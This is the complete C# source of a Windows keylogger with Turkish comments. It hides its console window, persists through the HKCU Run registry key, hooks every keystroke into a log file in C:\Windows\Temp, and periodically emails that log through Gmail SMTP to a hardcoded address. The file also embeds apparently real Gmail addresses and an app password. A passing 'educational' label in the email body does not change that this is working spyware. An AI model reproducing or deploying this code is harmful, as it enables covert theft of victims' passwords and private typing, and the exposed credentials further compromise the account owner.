using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail; // E-posta göndermek için eklendi
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32; // Kayıt Defteri (Registry) için eklendi

namespace keylogger
{

    internal class Program
    {
        // GİZLEME (STEALTH) İÇİN GEREKLİ WINDOWS API FONKSİYONLARI
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;

        // Windows API fonksiyonları (Klavye vuruşlarını dinlemek için)
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Gerekli sabitler ve değişkenler
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // ====================================================================
        // GÜNCEL PROJE AYARLARI (SADECE BURAYI DÜZENLEMENİZ GEREKİYOR)
        // ====================================================================

        // Log dosyasının kaydedileceği yerel yol. C:\Windows\Temp sessiz bir konumdur.
        private const string LogFilePath = "C:\\Windows\\Temp\\secure_log.txt";

        // E-posta Ayarları: Lütfen kendi mail adresleriniz ve Uygulama Şifreniz ile değiştirin.
        private const string RecipientEmail = "rabiakilic2323@gmail.com"; // Logların GELECEĞİ ADRES
        private const string SenderEmail = "rabiaklc77707@gmail.com"; // Logları GÖNDERECEK ADRES
        private const string SenderPassword ="hszb vvvb wdwc mzfs"; // Adım 1'de oluşturduğunuz 16 haneli şifre.

        // SMTP Ayarları (Gmail için):
        private const string SmtpHost = "smtp.gmail.com";
        private const int SmtpPort = 587;

        // Mail gönderme aralığı: 30 dakika (milisaniye cinsinden)
        private const int SendIntervalMs = 5 * 60 * 1000;

        // ====================================================================

        static void Main(string[] args)
        {
            // Konsol penceresini hemen gizle (Gizlenme özelliği)
            HideConsole();

            // Bilgisayar her açıldığında programın otomatik başlamasını sağla (Kalıcılık özelliği)
            AutoStart();

            // Klavye kancasını ayarla
            _hookID = SetHook(_proc);

            // Mail gönderme zamanlayıcısını başlatma
            System.Threading.Timer logTimer = new System.Threading.Timer(
                (e) => SendLogByEmail(),
                null,
                SendIntervalMs,   // İlk çalışma için bekleme süresi
                SendIntervalMs    // Tekrar aralığı
            );

            // Uygulamanın çalışmaya devam etmesini sağlamak için
            Application.Run();

            UnhookWindowsHookEx(_hookID);
        }

        private static void HideConsole()
        {
            // Uygulama çalışınca görünen siyah konsol ekranını gizler
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
            {
                ShowWindow(handle, SW_HIDE);
            }
        }

        private static void AutoStart()
        {
            try
            {
                // Programın tam yolunu al
                string appPath = Process.GetCurrentProcess().MainModule.FileName;
                string appName = Path.GetFileNameWithoutExtension(appPath);

                // Kayıt Defteri'ndeki Run (Çalıştır) anahtarını aç
                // Bu anahtar, Windows'un başlangıçta çalıştırdığı programları tutar.
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                // Uygulamayı kayıt defterine ekle
                if (key.GetValue(appName) == null)
                {
                    key.SetValue(appName, appPath);
                }
                key.Close();
            }
            catch (Exception ex)
            {
                // Kayıt defteri işlemi başarısız olursa (örneğin yetki eksikliği)
                // Hata mesajı normalde görünmez olacağı için sadece konsola yazılır.
                Console.WriteLine("AutoStart hatası: " + ex.Message);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();

                // Tuşu yerel dosyaya kaydet
                LogToFile(key);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Tuşu log.txt dosyasına yazan metot
        private static void LogToFile(string key)
        {
            // Logların içine tuş vuruşu yapıldığı zamanı ekle
            string timeStamp = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] ";

            // Özel tuşları daha okunaklı formatta kaydet
            if (key.Length > 1)
            {
                key = $" <{key}> ";
            }

            try
            {
                // Log dosyasını AppendText ile açıyoruz ve yeni tuşu ekliyoruz.
                File.AppendAllText(LogFilePath, key);
            }
            catch { /* Hata yönetimi (log dosyası kilitliyse vs.) */ }
        }

        // Log dosyasını E-posta ile gönderen metot (Yeni Mekanizma)
        private static void SendLogByEmail()
        {
            if (!File.Exists(LogFilePath))
            {
                // Dosya yoksa göndermeyi deneme
                return;
            }

            try
            {
                // 1. Mail mesajını oluşturma
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(SenderEmail);
                mail.To.Add(RecipientEmail);
                mail.Subject = "Keylogger Log Raporu - " + Environment.UserName + " | " + DateTime.Now.ToString("dd-MM-yyyy HH:mm");
                mail.Body = "Bu e-posta, eğitim amaçlı keylogger projenizin log dosyasını içerir.";

                // 2. Log dosyasını ekleme
                Attachment attachment = new Attachment(LogFilePath);
                mail.Attachments.Add(attachment);

                // 3. SMTP Ayarları
                SmtpClient smtp = new SmtpClient(SmtpHost);
                smtp.Port = SmtpPort;
                smtp.EnableSsl = true; // Güvenli bağlantı için SSL şarttır
                smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtp.UseDefaultCredentials = false;
                smtp.Credentials = new NetworkCredential(SenderEmail, SenderPassword);

                // 4. Maili Gönderme
                smtp.Send(mail);

                // 5. Gönderim Sonrası: Log dosyasının içeriğini temizleme
                File.WriteAllText(LogFilePath, string.Empty);
            }
            catch (Exception ex)
            {
                // Hata olursa (örneğin internet bağlantısı yoksa) program çökmez
                // Console.WriteLine("Mail gönderme hatası: " + ex.Message); 
            }
        }
    }
}
